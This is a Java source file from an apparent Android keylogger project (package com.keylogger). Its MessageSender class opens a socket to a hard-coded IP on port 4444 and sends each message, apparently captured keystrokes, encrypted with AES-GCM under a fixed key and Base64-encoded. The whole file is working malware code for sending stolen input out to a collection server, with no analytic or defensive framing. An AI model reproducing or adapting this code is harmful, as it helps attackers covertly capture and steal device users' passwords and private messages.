package com.keylogger;

import android.os.AsyncTask;
import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.PrintWriter;
import java.net.Socket;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;
import java.security.SecureRandom;
import javax.crypto.spec.GCMParameterSpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class MessageSender extends AsyncTask<String, Void, Void> {
    private static final String IP = "192.168.0.135";
    private static final int PORT = 4444;
    private static final String SECRET_KEY = "aesEncryptionKey";

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected Void doInBackground(String... strings) {
        String message = strings[0];
        try {
            Socket socket = new Socket(IP, PORT);
            PrintWriter printWriter = new PrintWriter(socket.getOutputStream());

            // Generate a random nonce
            SecureRandom random = new SecureRandom();
            byte[] nonce = new byte[12];  // 96-bit nonce
            random.nextBytes(nonce);

            // Encrypt the message with the nonce
            byte[] encryptedMessage = encrypt(message, SECRET_KEY, nonce);

            // Combine the nonce and the encrypted message
            byte[] combined = new byte[nonce.length + encryptedMessage.length];
            System.arraycopy(nonce, 0, combined, 0, nonce.length);
            System.arraycopy(encryptedMessage, 0, combined, nonce.length, encryptedMessage.length);

            // Send the combined message as a Base64-encoded string
            printWriter.write(Base64.getEncoder().encodeToString(combined));

            printWriter.flush();
            printWriter.close();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static byte[] encrypt(String message, String secretKey, byte[] nonce) throws Exception {
        Key key = new SecretKeySpec(secretKey.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.ENCRYPT_MODE, key, spec);
        return cipher.doFinal(message.getBytes());
    }
}
